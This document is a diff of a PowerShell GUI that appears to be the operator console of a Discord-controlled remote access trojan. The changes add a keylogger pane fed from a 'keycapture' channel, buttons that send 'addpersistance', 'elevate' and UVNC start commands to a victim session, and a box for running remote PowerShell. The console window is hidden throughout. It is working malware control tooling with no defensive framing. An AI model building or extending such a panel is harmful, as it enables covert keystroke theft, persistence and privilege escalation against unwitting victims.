@@ -5,6 +5,9 @@ Add-Type -AssemblyName System.Drawing
 # Variables for token and channel IDs
 $token = 'TOKEN_1_HERE' # YOUR MAIN BOT TOKEN (USED FOR CLIENT)
 $token2 = 'TOKEN_2_HERE' # BOT TO SEND MESSAGES AS USER
+
+# ============================ SCRIPT SETUP =============================
+
 $hidewindow = 1
 If ($HideWindow -gt 0){
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
@@ -57,6 +60,8 @@ function Get-DiscordChannelIDs {
             $global:ID2 = $channel.id
         } elseif ($channel.name -eq "session-control") {
             $global:ID3 = $channel.id
+        } elseif ($channel.name -eq "keycapture") {
+            $global:ID4 = $channel.id
         }
     }
 
@@ -64,7 +69,9 @@ function Get-DiscordChannelIDs {
 
 Get-DiscordChannelIDs -Token $token 
 
-$imageUrl = "https://i.ibb.co/ZGrt8qb/b-min.png"
+# ============================ GUI SETUP =============================
+
+$imageUrl = "https://i.imgur.com/RJSsYC7.png"
 $client = New-Object System.Net.WebClient
 $imageBytes = $client.DownloadData($imageUrl)
 $ms = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
@@ -75,44 +82,132 @@ $form.Width = 1255
 $form.Height = 950
 $form.BackColor = "#242424"
 $form.BackgroundImage = [System.Drawing.Image]::FromStream($ms, $true)
+$form.BackgroundImageLayout = 'Stretch'
+$iconMs = New-Object IO.MemoryStream
+$iconMs.Write($imageBytes, 0, $imageBytes.Length)
+$iconMs.Seek(0, 'Begin')
+$form.Icon = [System.Drawing.Icon]::FromHandle(( [System.Drawing.Bitmap]::FromStream($iconMs) ).GetHicon())
 
 $TextBoxHeader = New-Object System.Windows.Forms.Label
-$TextBoxHeader.Text = "Command Input"
+$TextBoxHeader.Text = "Powershell Input"
 $TextBoxHeader.AutoSize = $true
 $TextBoxHeader.ForeColor = "#eeeeee"
 $TextBoxHeader.Width = 25
 $TextBoxHeader.Height = 10
-$TextBoxHeader.Location = New-Object System.Drawing.Point(15, 840)
+$TextBoxHeader.Location = New-Object System.Drawing.Point(10, 840)
 $TextBoxHeader.Font = 'Microsoft Sans Serif,10,style=Bold'
 $form.Controls.Add($TextBoxHeader)
 
 $TextBoxInput = New-Object System.Windows.Forms.TextBox
 $TextBoxInput.Location = New-Object System.Drawing.Point(10, 860)
 $TextBoxInput.BackColor = "#eeeeee"
-$TextBoxInput.Width = 960
+$TextBoxInput.Width = 470
 $TextBoxInput.Height = 40
 $TextBoxInput.Text = ""
 $TextBoxInput.Multiline = $false
 $TextBoxInput.Font = 'Microsoft Sans Serif,10'
 $form.Controls.Add($TextBoxInput)
 
+$TextBox2Header = New-Object System.Windows.Forms.Label
+$TextBox2Header.Text = "Session Command Input"
+$TextBox2Header.AutoSize = $true
+$TextBox2Header.ForeColor = "#eeeeee"
+$TextBox2Header.Width = 25
+$TextBox2Header.Height = 10
+$TextBox2Header.Location = New-Object System.Drawing.Point(620, 840)
+$TextBox2Header.Font = 'Microsoft Sans Serif,10,style=Bold'
+$form.Controls.Add($TextBox2Header)
+
+$TextBox2Input = New-Object System.Windows.Forms.TextBox
+$TextBox2Input.Location = New-Object System.Drawing.Point(620, 860)
+$TextBox2Input.BackColor = "#eeeeee"
+$TextBox2Input.Width = 470
+$TextBox2Input.Height = 40
+$TextBox2Input.Text = ""
+$TextBox2Input.Multiline = $false
+$TextBox2Input.Font = 'Microsoft Sans Serif,10'
+$form.Controls.Add($TextBox2Input)
+
 $Button = New-Object System.Windows.Forms.Button
 $Button.Text = "Send"
 $Button.Width = 100
 $Button.Height = 35
-$Button.Location = New-Object System.Drawing.Point(980, 855)
+$Button.Location = New-Object System.Drawing.Point(495, 855)
 $Button.Font = 'Microsoft Sans Serif,10,style=Bold'
 $Button.BackColor = "#eeeeee"
 $form.Controls.Add($Button)
 
 $Button2 = New-Object System.Windows.Forms.Button
 $Button2.Text = "Close Session"
-$Button2.Width = 130
+$Button2.Width = 180
 $Button2.Height = 35
-$Button2.Location = New-Object System.Drawing.Point(1090, 855)
+$Button2.Location = New-Object System.Drawing.Point(1035, 785)
 $Button2.Font = 'Microsoft Sans Serif,10,style=Bold'
-$Button2.BackColor = "#eeeeee"
+$Button2.BackColor = "Red"
 $form.Controls.Add($Button2)
+
+$Button3 = New-Object System.Windows.Forms.Button
+$Button3.Text = "Send"
+$Button3.Width = 100
+$Button3.Height = 35
+$Button3.Location = New-Object System.Drawing.Point(1110, 855)
+$Button3.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button3.BackColor = "#eeeeee"
+$form.Controls.Add($Button3)
+
+$Button4 = New-Object System.Windows.Forms.Button
+$Button4.Text = "Add Persistance"
+$Button4.Width = 180
+$Button4.Height = 35
+$Button4.Location = New-Object System.Drawing.Point(1035, 480)
+$Button4.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button4.BackColor = "#eeeeee"
+$form.Controls.Add($Button4)
+
+$Button5 = New-Object System.Windows.Forms.Button
+$Button5.Text = "Try Get Admin"
+$Button5.Width = 180
+$Button5.Height = 35
+$Button5.Location = New-Object System.Drawing.Point(1035, 530)
+$Button5.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button5.BackColor = "#eeeeee"
+$form.Controls.Add($Button5)
+
+$Button6 = New-Object System.Windows.Forms.Button
+$Button6.Text = "Stop All Jobs"
+$Button6.Width = 180
+$Button6.Height = 35
+$Button6.Location = New-Object System.Drawing.Point(1035, 580)
+$Button6.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button6.BackColor = "#eeeeee"
+$form.Controls.Add($Button6)
+
+$Button7 = New-Object System.Windows.Forms.Button
+$Button7.Text = "Dark Mode"
+$Button7.Width = 180
+$Button7.Height = 35
+$Button7.Location = New-Object System.Drawing.Point(1035, 630)
+$Button7.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button7.BackColor = "#eeeeee"
+$form.Controls.Add($Button7)
+
+$Button8 = New-Object System.Windows.Forms.Button
+$Button8.Text = "Start UVNC"
+$Button8.Width = 180
+$Button8.Height = 35
+$Button8.Location = New-Object System.Drawing.Point(1035, 680)
+$Button8.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button8.BackColor = "#eeeeee"
+$form.Controls.Add($Button8)
+
+$Button9 = New-Object System.Windows.Forms.Button
+$Button9.Text = "Spawn Goose"
+$Button9.Width = 180
+$Button9.Height = 35
+$Button9.Location = New-Object System.Drawing.Point(1035, 730)
+$Button9.Font = 'Microsoft Sans Serif,10,style=Bold'
+$Button9.BackColor = "#eeeeee"
+$form.Controls.Add($Button9)
 
 $OutputBoxHeader = New-Object System.Windows.Forms.Label
 $OutputBoxHeader.Text = "Powershell Output"
@@ -120,19 +215,62 @@ $OutputBoxHeader.AutoSize = $true
 $OutputBoxHeader.ForeColor = "#eeeeee"
 $OutputBoxHeader.Width = 25
 $OutputBoxHeader.Height = 10
-$OutputBoxHeader.Location = New-Object System.Drawing.Point(15, 470)
+$OutputBoxHeader.Location = New-Object System.Drawing.Point(10, 460)
 $OutputBoxHeader.Font = 'Microsoft Sans Serif,10,style=Bold'
 $form.Controls.Add($OutputBoxHeader)
 
-$OutputBox = New-Object System.Windows.Forms.TextBox 
+$OutputBox = New-Object System.Windows.Forms.RichTextBox 
 $OutputBox.Multiline = $True
-$OutputBox.Location = New-Object System.Drawing.Size(10,490) 
-$OutputBox.Width = 1215
+$OutputBox.Location = New-Object System.Drawing.Size(10,480) 
+$OutputBox.Width = 600
 $OutputBox.Height = 340
 $OutputBox.Scrollbars = "Vertical" 
 $OutputBox.Text = ""
 $OutputBox.Font = 'Microsoft Sans Serif,10'
+$OutputBox.BackColor = "#d3d3d3"
 $form.Controls.Add($OutputBox)
+
+$OutputBoxHeader2 = New-Object System.Windows.Forms.Label
+$OutputBoxHeader2.Text = "Keylogger"
+$OutputBoxHeader2.AutoSize = $true
+$OutputBoxHeader2.ForeColor = "#eeeeee"
+$OutputBoxHeader2.Width = 25
+$OutputBoxHeader2.Height = 10
+$OutputBoxHeader2.Location = New-Object System.Drawing.Point(620, 460)
+$OutputBoxHeader2.Font = 'Microsoft Sans Serif,10,style=Bold'
+$form.Controls.Add($OutputBoxHeader2)
+
+$OutputBox2 = New-Object System.Windows.Forms.RichTextBox
+$OutputBox2.Multiline = $True
+$OutputBox2.Location = New-Object System.Drawing.Size(620,480) 
+$OutputBox2.Width = 400
+$OutputBox2.Height = 150
+$OutputBox2.Scrollbars = "Vertical" 
+$OutputBox2.Text = ""
+$OutputBox2.Font = 'Microsoft Sans Serif,10'
+$OutputBox2.BackColor = "#d3d3d3"
+$form.Controls.Add($OutputBox2)
+
+$OutputBoxHeader3 = New-Object System.Windows.Forms.Label
+$OutputBoxHeader3.Text = "Session"
+$OutputBoxHeader3.AutoSize = $true
+$OutputBoxHeader3.ForeColor = "#eeeeee"
+$OutputBoxHeader3.Width = 25
+$OutputBoxHeader3.Height = 10
+$OutputBoxHeader3.Location = New-Object System.Drawing.Point(620, 650)
+$OutputBoxHeader3.Font = 'Microsoft Sans Serif,10,style=Bold'
+$form.Controls.Add($OutputBoxHeader3)
+
+$OutputBox3 = New-Object System.Windows.Forms.RichTextBox
+$OutputBox3.Multiline = $True
+$OutputBox3.Location = New-Object System.Drawing.Size(620,670) 
+$OutputBox3.Width = 400
+$OutputBox3.Height = 150
+$OutputBox3.Scrollbars = "Vertical" 
+$OutputBox3.Text = ""
+$OutputBox3.Font = 'Microsoft Sans Serif,10'
+$OutputBox3.BackColor = "#d3d3d3"
+$form.Controls.Add($OutputBox3)
 
 $pictureBox1Header = New-Object System.Windows.Forms.Label
 $pictureBox1Header.Text = "Screenshots"
@@ -140,7 +278,7 @@ $pictureBox1Header.AutoSize = $true
 $pictureBox1Header.ForeColor = "#eeeeee"
 $pictureBox1Header.Width = 25
 $pictureBox1Header.Height = 10
-$pictureBox1Header.Location = New-Object System.Drawing.Point(15, 25)
+$pictureBox1Header.Location = New-Object System.Drawing.Point(10, 30)
 $pictureBox1Header.Font = 'Microsoft Sans Serif,10,style=Bold'
 $form.Controls.Add($pictureBox1Header)
 
@@ -150,9 +288,11 @@ $pictureBox2Header.AutoSize = $true
 $pictureBox2Header.ForeColor = "#eeeeee"
 $pictureBox2Header.Width = 25
 $pictureBox2Header.Height = 10
-$pictureBox2Header.Location = New-Object System.Drawing.Point(630, 25)
+$pictureBox2Header.Location = New-Object System.Drawing.Point(620, 30)
 $pictureBox2Header.Font = 'Microsoft Sans Serif,10,style=Bold'
 $form.Controls.Add($pictureBox2Header)
+
+# ============================ FUNCTION SETUP =============================
 
 function Create-ImageForm {
     param ([string]$imagePath1,[string]$imagePath2)
@@ -188,14 +328,32 @@ function Update-ImageForm {
     $pictureBox.Refresh()
 }
 
-Function Add-OutputBoxLine{
-    Param ($outfeed) 
+Function Add-OutputBoxLine {
+    Param (
+        [string]$outfeed,
+        [ValidateSet("OutputBox", "OutputBox2", "OutputBox3")]
+        [string]$OutputBoxName,
+        [string]$ForeColor,
+        [string]$BackColor
+    )
+
     $formattedOutfeed = $outfeed -replace "`n", "`r`n"
-    $OutputBox.AppendText("`r`n$formattedOutfeed`r`n")
-    $OutputBox.Refresh()
-    $OutputBox.ScrollToCaret()
+    switch ($OutputBoxName) {
+        "OutputBox" { $OutputBoxRef = $OutputBox }
+        "OutputBox2" { $OutputBoxRef = $OutputBox2 }
+        "OutputBox3" { $OutputBoxRef = $OutputBox3 }
+    }
+
+    $OutputBoxRef.SelectionStart = $OutputBoxRef.TextLength
+    $OutputBoxRef.SelectionLength = 0
+    $OutputBoxRef.SelectionColor = $ForeColor
+    $OutputBoxRef.SelectionBackColor = $BackColor
+    $OutputBoxRef.AppendText("`r`n$formattedOutfeed")
+    $OutputBoxRef.SelectionColor = $OutputBoxRef.ForeColor
+    $OutputBoxRef.SelectionBackColor = $OutputBoxRef.BackColor
+    $OutputBoxRef.Refresh()
+    $OutputBoxRef.ScrollToCaret()
 }
-Add-OutputBoxLine -Outfeed "Starting Connection..."
 
 function sendMsg {
     param([string]$Message,[string]$id)
@@ -225,6 +383,48 @@ Function Get-BotUserId {
     return $botInfo.id
 }
 $botId = Get-BotUserId
+
+function DisplayNewMSG{
+    param([string]$box,[string]$id)
+
+    $latestMessageId = $null
+    $headers = @{
+        'Authorization' = "Bot $token"
+    }
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("Authorization", $headers.Authorization)
+    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$ID/messages")
+    $messages = $messages | ConvertFrom-Json
+    $newMessages = @()
+    foreach ($message in $messages) {
+        if ($message.timestamp -gt $lastMessageId) {
+            if ($message.author.bot -and $message.author.id -eq $botId) {
+                $newMessages += $message
+            }
+        }
+    }
+    if ($newMessages.Count -gt 0) {
+        $latestMessageId = ($newMessages | Sort-Object -Property timestamp -Descending)[0].timestamp
+        $script:lastMessageId = $latestMessageId
+        $sortedNewMessages = $newMessages | Sort-Object -Property timestamp
+        foreach ($message in $sortedNewMessages) {
+            $messageContent = $message.content -replace "``" ,""
+            if ($messageContent -like ":mag_right: `Keys Captured :*") {
+                $messageContent = $messageContent -replace "^:mag_right: `Keys Captured :", ""
+                Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box
+            }
+            elseif ($messageContent -like "PS |*"){
+                Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box -ForeColor "Gray"
+            }
+            else{
+                Add-OutputBoxLine -Outfeed $messageContent -OutputBoxName $box 
+            }
+        }
+    }
+
+}
+
+# ============================ LOOP SETUP =============================
 
 $headers = @{
     'Authorization' = "Bot $token"
@@ -291,37 +491,22 @@ $timer.Add_Tick({
         Write-Error "An error occurred: $_"
     }
 
-    $latestMessageId = $null
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("Authorization", $headers.Authorization)
-    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$PSID/messages")
-    $messages = $messages | ConvertFrom-Json
-    $newMessages = @()
-    foreach ($message in $messages) {
-        if ($message.timestamp -gt $lastMessageId) {
-            if ($message.author.bot -and $message.author.id -eq $botId) {
-                $newMessages += $message
-            }
-        }
-    }
-    if ($newMessages.Count -gt 0) {
-        $latestMessageId = ($newMessages | Sort-Object -Property timestamp -Descending)[0].timestamp
-        $script:lastMessageId = $latestMessageId
-        $sortedNewMessages = $newMessages | Sort-Object -Property timestamp
-        foreach ($message in $sortedNewMessages) {
-            Add-OutputBoxLine -Outfeed $message.content
-        }
-    }
+
+
+    DisplayNewMSG -id $PSID -box "OutputBox"
+    sleep -m 200
+    DisplayNewMSG -id $ID4 -box "OutputBox2"
+    sleep -m 200
+    DisplayNewMSG -id $ID3 -box "OutputBox3"
+
 })
 
+# ============================ ACTION SETUP =============================
 
 $button.Add_Click({
-
 $msgtosend = $TextBoxInput.Text
 sendMsg -Message $msgtosend -id $PSID
+Add-OutputBoxLine -Outfeed "PS Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
 })
 
 $button2.Add_Click({
@@ -329,7 +514,7 @@ $button2.Add_Click({
     $msgtosend = $TextBoxInput.Text
     $sure = (New-Object -ComObject Wscript.Shell).Popup("Are you Sure you want to quit?",0,"Close Session",0x1)
     if ($sure -eq 1){
-        Add-OutputBoxLine -Outfeed "CLOSING SESSION"
+        Add-OutputBoxLine -Outfeed "CLOSING SESSION" -OutputBoxName "OutputBox3" -ForeColor "Red"
         sendMsg -Message 'close' -id $ID3
         sleep 3
         $form.Close()
@@ -337,6 +522,83 @@ $button2.Add_Click({
         exit
     }
 })
+
+$button3.Add_Click({
+$msgtosend = $TextBox2Input.Text
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+$4on = $false
+$button4.Add_Click({
+if ($4on -eq $false){
+    $Button4.Text = "Remove Persistance"
+    $msgtosend = 'addpersistance'
+    $script:4on = $true
+}
+else{
+    $Button4.Text = "Add Persistance"
+    $msgtosend = 'removepersistance'
+    $script:4on = $false
+}
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+$button5.Add_Click({
+$msgtosend = 'elevate'
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+$6on = $false
+$button6.Add_Click({
+if ($6on -eq $false){
+    $button6.Text = "Start All Jobs"
+    $msgtosend = 'pausejobs'
+    $script:6on = $true
+}
+else{
+    $button6.Text = "Stop All Jobs"
+    $msgtosend = 'startall'
+    $script:6on = $false
+}
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+$7on = $false
+$button7.Add_Click({
+if ($7on -eq $false){
+    $button7.Text = "Light Mode"
+    $msgtosend = 'enabledarkmode'
+    $script:7on = $true
+}
+else{
+    $button7.Text = "Dark Mode"
+    $msgtosend = 'disabledarkmode'
+    $script:7on = $false
+}
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+$button8.Add_Click({
+$args = $TextBox2Input.Text
+$msgtosend = "startuvnc $args"
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+$button9.Add_Click({
+$msgtosend = "goose"
+sendMsg -Message $msgtosend -id $ID3
+Add-OutputBoxLine -Outfeed "Session Command Sent : $msgtosend" -OutputBoxName "OutputBox3" -ForeColor "Green"
+})
+
+# ============================ START GUI =============================
+
+Add-OutputBoxLine -Outfeed "Setup Complete" -OutputBoxName "OutputBox3" -ForeColor "Green"
 
 $timer.Start()
 [System.Windows.Forms.Application]::Run($form)
